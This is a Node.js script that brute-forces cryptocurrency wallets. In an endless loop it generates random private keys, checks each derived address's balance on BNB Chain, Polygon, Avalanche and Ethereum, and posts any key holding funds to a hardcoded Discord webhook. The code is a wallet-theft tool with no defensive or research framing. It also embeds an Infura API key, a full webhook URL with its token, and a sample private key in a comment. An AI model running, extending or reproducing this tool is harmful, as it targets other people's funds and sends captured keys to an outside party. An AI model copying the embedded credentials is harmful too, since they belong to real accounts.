const ethers = require("ethers");
const axios = require("axios");

const rpcUrlBNB = "https://bsc-dataseed.binance.org/";  // Example for Binance Smart Chain
const rpcUrlPol = "https://polygon-rpc.com/";
const rpcUrlAvl = "https://api.avax.network/ext/bc/C/rpc";
const rpcUrlETH = "https://mainnet.infura.io/v3/04b15259107348bda21703a99ada9e3d";
// Create a provider
const provider1 = new ethers.JsonRpcProvider(rpcUrlBNB);
const provider2 = new ethers.JsonRpcProvider(rpcUrlPol);
const provider3 = new ethers.JsonRpcProvider(rpcUrlAvl);
const provider4 = new ethers.JsonRpcProvider(rpcUrlETH);

function generateRandomString() {
    const characters = 'abcdef0123456789';
    let result = '';
    
    for (let i = 0; i < 64; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    
    return result;
}

const webhookUrl = "https://discord.com/api/webhooks/1253488131974365195/V0xhPBrkFBySYVaeoAF0VjNKTQHLY3fjDodGoanrxIFBgtWU-EWaLsexA38GuLsJtnuA";


async function check(){
    while(1) {
        try {
            const privateKeyRandom = generateRandomString();
            // const privateKeyRandom = "fed6bdfb8a6cdeb92cd901a446f1c41a11f42b4f3801b45630a8e09937ced328"
            // console.log(privateKeyRandom)
            const wallet = new ethers.Wallet(privateKeyRandom, provider1);
            // Check if the wallet address can be derived (this ensures the private key is valid)
            // console.log(`Wallet address: ${wallet.address}`);
            const balance1 = await provider1.getBalance(wallet.address)
            // console.log(ethers.formatEther(balance1))
            if(parseFloat(ethers.formatEther(balance1)) !== 0.0) {
                await axios.post(webhookUrl, {
                    content: `BNB, ${privateKeyRandom}, bal ${balance1}`
                });
            }
            const balance2 = await provider2.getBalance(wallet.address)
            if(parseFloat(ethers.formatEther(balance2)) !== 0.0) {
                await axios.post(webhookUrl, {
                    content: `POL, ${privateKeyRandom}, bal ${balance2}`
                });
            }
            const balance3 = await provider3.getBalance(wallet.address)
            if(parseFloat(ethers.formatEther(balance3)) !== 0.0) {
                await axios.post(webhookUrl, {
                    content: `AVL, ${privateKeyRandom}, bal ${balance3}`
                });
            }
            const balance4 = await provider4.getBalance(wallet.address)
            if(parseFloat(ethers.formatEther(balance4)) !== 0.0) {
                await axios.post(webhookUrl, {
                    content: `ETH, ${privateKeyRandom}, bal ${balance4}`
                });
            }

        }
        catch (error) {
            console.error("Failed to connect or invalid private key:", error);
            console.error(error)
        }
    }
}

check()